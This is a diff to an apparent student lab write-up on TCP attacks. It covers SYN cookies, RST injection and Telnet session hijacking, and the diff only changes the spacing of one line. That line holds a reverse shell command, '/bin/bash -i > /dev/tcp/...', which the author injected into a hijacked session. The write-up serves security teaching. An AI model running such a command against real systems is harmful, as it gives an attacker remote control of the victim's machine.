@@ -15,7 +15,7 @@ I observed that modern Linux systems use SYN Cookies to defend against these flo
 ### TCP Reset (RST) Attack
 I discovered that any established TCP connection can be forcibly closed if an attacker can sniff the traffic and spoof a packet with the RST flag set and the correct Sequence Number.
 ### TCP Session Hijacking
-This was the most complex task. By predicting or sniffing the Next Sequence Number, I was able to inject malicious data into an active Telnet session.Reverse Shell Injection: I combined session hijacking with a Reverse Shell attack. By injecting the command ```/bin/bash -i >/dev/tcp/10.9.0.105/9090 0<&1 2>&1``` into the hijacked session, I forced the victim to give the attacker a remote command prompt.
+This was the most complex task. By predicting or sniffing the Next Sequence Number, I was able to inject malicious data into an active Telnet session.Reverse Shell Injection: I combined session hijacking with a Reverse Shell attack. By injecting the command ```/bin/bash -i > /dev/tcp/10.9.0.105/9090 0<&1 2>&1``` into the hijacked session, I forced the victim to give the attacker a remote command prompt.
 
 ## 🔍 Troubleshooting Log
 | Issue Encountered | Root Cause | Solution/Observation |
